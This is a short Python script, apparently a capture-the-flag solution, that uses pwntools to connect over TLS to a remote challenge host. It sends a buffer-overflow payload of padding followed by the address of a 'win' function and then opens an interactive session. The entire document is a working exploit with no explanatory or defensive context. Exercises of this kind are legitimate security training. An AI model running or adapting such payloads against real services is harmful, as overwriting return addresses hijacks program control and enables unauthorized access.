from pwn import *


p = remote("inst-tg2znb9bv1.tls.vuln.si", 443, ssl=True )

length = cyclic_find(0x6161617461616173)

win = 0x40119e
payload = b"A" * length
payload += p64(win)

p.sendline(payload)
p.interactive()